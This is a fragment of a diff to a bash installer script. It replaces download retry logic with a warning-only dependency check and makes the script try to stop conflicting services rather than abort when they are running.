-            log_message "All download attempts failed - attempting DNS fix..."
-            if fix_dns_and_retry; then
-                log_message "DNS fixed - retrying download one more time..."
-                dns_fix_attempted=true
-                max_retries=$((max_retries + 1))  # Give one more chance
-                sleep 3
-            fi
-        elif [ $retry -lt $max_retries ]; then
-            log_message "Retry in 3 seconds..."
-            sleep 3
+    for cmd in "${required_deps[@]}"; do
+        if ! command_exists "$cmd"; then
+            missing_deps+=("$cmd")
         fi
     done
     
-    log_message "ERROR: $description failed after all retry attempts with both curl and wget"
-    return 1
+    if [ ${#missing_deps[@]} -gt 0 ]; then
+        log_message "WARNING: Missing dependencies: ${missing_deps[*]}"
+        log_message "Will attempt to continue anyway"
+        return 1
+    fi
+    
+    return 0
 }
 
 root_installation() {
@@ -896,17 +979,24 @@ log_message "Script started by user: $(whoami)"
 
 # Check dependencies first
 if ! check_dependencies; then
-    log_message "ERROR: Dependency check failed. Exiting."
-    exit 1
+    log_message "WARNING: Dependency check failed. Continuing anyway..."
 fi
 
-# Service checks
+# Service checks (using enhanced functions)
 log_message "Checking for conflicting services..."
 for service in "${SERVICES_TO_CHECK[@]}"; do
     if does_service_exist "$service"; then
         if is_service_running "$service"; then
-            log_message "ERROR: Service $service is running. Aborting."
-            exit 1
+            log_message "ERROR: Service $service is running. Attempting to stop..."
+            safe_service_stop "$service"
+            sleep 2
+            # Check again
+            if is_service_running "$service"; then
+                log_message "ERROR: Could not stop $service. Aborting."
+                exit 1
+            else
+                log_message "Service $service stopped successfully"
+            fi
         else
             log_message "Service $service exists but is not running"
         fi
